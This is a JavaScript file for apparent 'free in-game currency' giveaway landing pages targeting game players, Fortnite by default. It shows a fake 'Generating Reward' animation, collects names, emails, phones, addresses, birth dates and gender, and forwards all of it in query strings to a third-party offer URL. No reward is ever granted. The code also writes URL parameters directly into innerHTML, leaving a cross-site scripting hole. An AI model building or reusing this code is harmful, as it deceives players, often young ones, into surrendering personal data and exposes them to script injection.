/* Unified Script for both LP pages */

document.addEventListener("DOMContentLoaded", () => {
  loadConfig();
  setupForm();
  detectAndSelectCountry();
  updateYear();
  setupMenu();
  setupRedirects();
});

let currentConfig = {};

function updateYear() {
  const yearEl = document.getElementById("current-year");
  if (yearEl) yearEl.textContent = new Date().getFullYear();
}

function setupRedirects() {
  // Setup all signup buttons to redirect to signup.html
  document.querySelectorAll('[data-action="signup"]').forEach(btn => {
    btn.addEventListener('click', () => {
      window.location.href = 'signup.html' + window.location.search;
    });
  });
}

async function loadConfig() {
  try {
    const response = await fetch("config.json");
    const fullConfig = await response.json();

    const urlParams = new URLSearchParams(window.location.search);
    const gameId = urlParams.get("game") || "fortnite";

    const gameConfig = fullConfig[gameId] || fullConfig["fortnite"];

    if (gameConfig) {
      // Allow URL params to override config values
      let finalConfig = {};
      for (const key in gameConfig) {
        finalConfig[key] = urlParams.get(key) || gameConfig[key];
      }
      currentConfig = finalConfig;
      applyConfig(finalConfig);
    } else {
      console.error("Game config not found for:", gameId);
    }

    // Auto-trigger reward animation if URL param exists
    if (urlParams.get("reward") === "true") {
      setTimeout(triggerReward, 400);
    }
  } catch (error) {
    console.error("Error loading config:", error);
  }
}

function triggerReward() {
  const overlay = document.getElementById("reward-overlay");
  if (overlay) overlay.classList.add("active");
}

function hideReward() {
  const overlay = document.getElementById("reward-overlay");
  if (overlay) {
    overlay.classList.remove("active");
  }
}

function applyConfig(config) {
  // Text Content Updates using IDs
  updateText("reward-amount-short", config.REWARD_POINTS);
  updateText("reward-amount-desktop", config.REWARD_POINTS);

  // HTML Content Updates - signup.html elements
  updateHTML("hero-headline", config.HERO_HEADLINE || `Claim ${config.GAME_CURRENCY}`);
  updateHTML("hero-subheadline", config.CHALLENGE_TEXT);
  updateHTML("cta-text", config.CTA_TEXT);

  // HTML Content Updates - index.html elements
  updateHTML("index-hero-headline", `Play ${config.GAME_NAME}.<br /><span class="text-neon-cyan text-stroke-neon">Earn ${config.GAME_CURRENCY}!</span>`);
  updateHTML("index-hero-subheadline", `The world's #1 reward platform for ${config.GAME_NAME} players. Complete in-game challenges, level up your account, and claim massive rewards daily.`);
  updateText("index-cta-text", `CLAIM YOUR ${config.GAME_CURRENCY}`);
  updateText("site-title", `${config.GAME_CURRENCY} GiveAway`);

  // Page Title
  if (config.GAME_CURRENCY) {
    document.title = `${config.GAME_CURRENCY} GiveAway - Play & Earn`;
    const titleEl = document.getElementById("page-title");
    if (titleEl) {
      document.title = `Claim ${config.GAME_CURRENCY}`;
    }
  }

  // Hero Image - both pages
  if (config.HERO_IMAGE) {
    const heroImageEl = document.getElementById("hero-image");
    if (heroImageEl && (!heroImageEl.style.backgroundImage || heroImageEl.style.backgroundImage === 'none')) {
      heroImageEl.style.backgroundImage = `url('${config.HERO_IMAGE}')`;
    }
    const indexHeroImageEl = document.getElementById("index-hero-image");
    // Only set the index hero image if there isn't an existing inline background-image
    if (indexHeroImageEl && (!indexHeroImageEl.style.backgroundImage || indexHeroImageEl.style.backgroundImage === 'none')) {
      indexHeroImageEl.style.backgroundImage = `url('${config.HERO_IMAGE}')`;
    }
  }

  // Dynamic Disclaimer
  if (config.GAME_NAME) {
    const disclaimer = document.querySelector("footer p.text-gray-600");
    if (disclaimer) {
      disclaimer.innerText = `Disclaimer: This platform is not affiliated with, maintained, authorized, endorsed, or sponsored by ${config.GAME_NAME} or its developers. Terms and conditions apply. All rewards are subject to availability.`;
    }
  }

  // Theme Colors
  if (config.COLORS) {
    const root = document.documentElement.style;
    if (config.COLORS.primary) root.setProperty("--color-primary", config.COLORS.primary);
    if (config.COLORS.gold) root.setProperty("--color-gold", config.COLORS.gold);
    if (config.COLORS.neon_cyan) root.setProperty("--color-neon-cyan", config.COLORS.neon_cyan);
    if (config.COLORS.background_dark) root.setProperty("--color-bg-dark", config.COLORS.background_dark);
    if (config.COLORS.background_light) root.setProperty("--color-bg-light", config.COLORS.background_light);
  }

  // Handle data-var attributes
  document.querySelectorAll("[data-var]").forEach((el) => {
    const varName = el.getAttribute("data-var");
    if (config[varName]) {
      if (el.tagName === "IMG") {
        el.src = config[varName];
      } else if (el.hasAttribute("data-bg")) {
        el.style.backgroundImage = `url("${config[varName]}")`;
      } else if (el.tagName === "TITLE") {
        document.title = config[varName];
      } else {
        el.innerHTML = config[varName];
      }
    }
  });
}

function updateText(id, value) {
  const element = document.getElementById(id);
  if (element && value) element.innerText = value;
}

function updateHTML(id, value) {
  const element = document.getElementById(id);
  if (element && value) element.innerHTML = value;
}

function setupForm() {
  const form = document.querySelector("form");
  if (form) {
    form.addEventListener("submit", (e) => {
      e.preventDefault();
      handleSubmission();
    });
  }
}

// Auto-detect user's country and select matching option in the #country select
async function detectAndSelectCountry() {
  const select = document.getElementById("country");
  if (!select) {
    console.log('detectAndSelectCountry: no #country select found');
    return;
  }

  // 0) Check URL params first for an explicit lang/locale override (e.g. ?lang=fr-FR or ?lang=FR)
  try {
    const urlParams = new URLSearchParams(window.location.search);
    // Prefer explicit `country` param (2-letter code or full name)
    const countryParam = urlParams.get('country');
    if (countryParam) {
      console.log('detectAndSelectCountry: found country param in URL ->', countryParam);
      // try code first
      if (setIfExists(countryParam)) {
        console.log('detectAndSelectCountry: matched from URL country param (code)', countryParam);
        return;
      }
      // try matching by country name (case-insensitive, partial)
      const name = String(countryParam).trim().toLowerCase();
      if (name) {
        const optByName = Array.from(select.options).find(o => o.textContent.trim().toLowerCase().includes(name));
        if (optByName) {
          select.value = optByName.value;
          select.dispatchEvent(new Event('change', { bubbles: true }));
          console.log('detectAndSelectCountry: matched from URL country param (name)', optByName.value, '-', optByName.textContent.trim());
          return;
        }
      }

    }
    // fallback to lang/locale params if country not provided
    const langParam = urlParams.get('lang') || urlParams.get('locale') || urlParams.get('language');
    if (langParam) {
      console.log('detectAndSelectCountry: found lang param in URL ->', langParam);
      const parts = String(langParam).replace('_', '-').split('-');
      if (parts.length > 1) {
        const possible = parts[parts.length - 1];
        console.log('detectAndSelectCountry: lang param candidate ->', possible);
        if (setIfExists(possible)) {
          console.log('detectAndSelectCountry: matched from URL lang param', langParam);
          return;
        }
      } else {
        // maybe it's already a country code
        const possible = parts[0];
        console.log('detectAndSelectCountry: lang param single part ->', possible);
        if (setIfExists(possible)) {
          console.log('detectAndSelectCountry: matched from URL lang param (single part)', langParam);
          return;
        }
      }
    }
  } catch (e) {
    console.error('detectAndSelectCountry error parsing URL lang param', e);
  }

  function setIfExists(code) {
    if (!code) return false;
    const cc = String(code).toUpperCase();
    console.log('detectAndSelectCountry: try set country code ->', cc);
    const opt = Array.from(select.options).find((o) => o.value === cc);
    if (opt) {
      select.value = cc;
      select.dispatchEvent(new Event('change', { bubbles: true }));
      console.log('detectAndSelectCountry: selected country', cc, '-', opt.textContent.trim());
      return true;
    }
    console.log('detectAndSelectCountry: no option for', cc);
    return false;
  }

  // 1) IP-based geolocation FIRST (most accurate for real location)
  try {
    console.log('detectAndSelectCountry: attempting IP geolocation (primary)');
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 3000);
    const res = await fetch('https://ipapi.co/json', { signal: controller.signal });
    clearTimeout(timeout);
    if (res && res.ok) {
      const data = await res.json();
      console.log('detectAndSelectCountry: ipapi result ->', data && (data.country_code || data.country));
      if (data && (data.country_code || data.country)) {
        if (setIfExists(data.country_code || data.country)) {
          console.log('detectAndSelectCountry: matched from IP geolocation');
          return;
        }
      }
    }
  } catch (e) {
    console.warn('detectAndSelectCountry: IP geolocation failed or timed out', e);
  }


  // 2) Try timezone-based heuristic (e.g., Africa/Casablanca -> MA)
  try {
    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
    console.log('detectAndSelectCountry: timezone ->', tz);
    if (tz) {
      const tzLower = String(tz).toLowerCase();
      // Quick match for Morocco
      if (tzLower.includes('casablanca') || tzLower.includes('rab') || tzLower.includes('africa')) {
        if (setIfExists('MA')) return;
      }
      // If timezone has a region like Europe/Paris -> try country code via known mapping
      const tzParts = tz.split('/');
      if (tzParts.length > 1) {
        const region = tzParts[1];
        // region might be a city; try to match by option text containing city name
        const optByCity = Array.from(select.options).find(o => o.textContent.trim().toLowerCase().includes(region.toLowerCase()));
        if (optByCity) {
          select.value = optByCity.value;
          select.dispatchEvent(new Event('change', { bubbles: true }));
          console.log('detectAndSelectCountry: matched from timezone city ->', optByCity.value, '-', optByCity.textContent.trim());
          return;
        }
      }
    }
  } catch (e) {
    console.error('detectAndSelectCountry timezone check failed', e);
  }


  // 3) Last resort: browser locale (navigator) to detect country codes (e.g. en-US -> US)
  try {
    const locales = navigator.languages && navigator.languages.length ? navigator.languages : [navigator.language || navigator.userLanguage];
    console.log('detectAndSelectCountry: navigator locales ->', locales);
    for (const locale of locales) {
      if (!locale) continue;
      const parts = locale.replace('_', '-').split('-');
      // try country part (last segment) first
      if (parts.length > 1) {
        const possible = parts[parts.length - 1];
        console.log('detectAndSelectCountry: checking locale', locale, '-> candidate', possible);
        if (setIfExists(possible)) {
          console.log('detectAndSelectCountry: matched from locale', locale);
          return;
        }
      } else {
        console.log('detectAndSelectCountry: locale has no region part:', locale);
      }
    }
  } catch (e) {
    console.error('detectAndSelectCountry error parsing navigator locales', e);
  }

  console.log('detectAndSelectCountry: no match from any method; leaving default');
}

function showRewardAnimation() {
  // Create or show overlay
  let overlay = document.getElementById("reward-overlay");
  if (!overlay) {
    overlay = document.createElement("div");
    overlay.id = "reward-overlay";
    overlay.className =
      "reward-overlay flex flex-col items-center justify-center fixed inset-0 z-50 bg-black/90 backdrop-blur-sm"; // Tailwind classes added
    overlay.innerHTML = `
            <div class="coin-shower p-4">
                <img src="logo.png" alt="Logo" class="animate-bounce" style="width: 80px; height: auto;" />
            </div>
            <h2 class="text-white text-2xl font-black uppercase italic mt-4 animate-pulse">Generating Reward...</h2>
            <p class="text-gold font-bold text-xl mt-2">${currentConfig.REWARD_POINTS || "Points"} Adding...</p>
        `;
    document.body.appendChild(overlay);
  }
  overlay.style.display = "flex";
}

function handleSubmission() {
  // 1. Collect form data before showing animation
  const formData = collectFormData();

  // 2. Store form data in sessionStorage to access during redirect
  sessionStorage.setItem("pendingFormData", JSON.stringify(formData));

  // 3. Show processing/reward animation
  showRewardAnimation();

  // 4. Redirect after a short delay
  redirectToOffer(formData);
}

// Mobile sidebar/menu behavior
function setupMenu() {
  const menuBtn = document.getElementById('menu-button');
  const sidebar = document.getElementById('mobile-sidebar');
  const closeBtn = document.getElementById('mobile-sidebar-close');

  if (!menuBtn || !sidebar) return;

  function openSidebar() {
    sidebar.classList.add('open');
    sidebar.setAttribute('aria-hidden', 'false');
    document.body.style.overflow = 'hidden';
  }

  function closeSidebar() {
    sidebar.classList.remove('open');
    sidebar.setAttribute('aria-hidden', 'true');
    document.body.style.overflow = '';
  }

  menuBtn.addEventListener('click', (e) => {
    e.preventDefault();
    openSidebar();
  });

  if (closeBtn) closeBtn.addEventListener('click', closeSidebar);

  // Close when clicking overlay
  sidebar.querySelectorAll('[data-action="close-sidebar"], .mobile-sidebar-overlay').forEach((el) => {
    el.addEventListener('click', closeSidebar);
  });

  // Close on Escape
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && sidebar.classList.contains('open')) closeSidebar();
  });
}

function collectFormData() {
  const form = document.querySelector("form");
  const formData = new FormData(form);
  const data = {};

  // Collect all form field values by name attribute
  for (let [key, value] of formData.entries()) {
    data[key] = value;
  }

  // Also collect fields by ID as fallback
  const fieldsById = {
    first_name: document.getElementById("first-name")?.value || "",
    last_name: document.getElementById("last-name")?.value || "",
    email: document.getElementById("email")?.value || "",
    phone: document.querySelector('input[name="phone"]')?.value || "",
    country: document.getElementById("country")?.value || "",
    address: document.querySelector('input[name="address"]')?.value || "",
    city: document.querySelector('input[name="city"]')?.value || "",
    state: document.getElementById("state")?.value || "",
    zip: document.querySelector('input[name="zip"]')?.value || "",
    gender: document.querySelector('select[name="gender"]')?.value || "",
    dob: document.querySelector('input[name="dob"]')?.value || "",
  };

  // Merge - form fields with name attributes take priority
  return { ...fieldsById, ...data };
}

function redirectToOffer(formData) {
  // Construct Redirect URL
  const baseOfferUrl = currentConfig.OFFER_URL || "https://www.lootsquest.com";

  const url = new URL(baseOfferUrl);

  // Get existing URL params from current page
  const urlParams = new URLSearchParams(window.location.search);

  // Append all current params to the offer URL
  urlParams.forEach((value, key) => {
    url.searchParams.append(key, value);
  });

  // Append all form field data
  Object.keys(formData).forEach((key) => {
    if (formData[key] && formData[key].trim() !== "") {
      url.searchParams.append(key, formData[key]);
    }
  });

  // Also append game-specific info from config
  if (currentConfig.GAME_NAME) {
    url.searchParams.append("game_name", currentConfig.GAME_NAME);
  }

  if (currentConfig.GAME_CURRENCY) {
    url.searchParams.append("currency", currentConfig.GAME_CURRENCY);
  }

  if (currentConfig.REWARD_POINTS) {
    url.searchParams.append("reward_points", currentConfig.REWARD_POINTS);
  }

  // Clear the stored form data
  sessionStorage.removeItem("pendingFormData");

  window.location.href = url.toString();
}



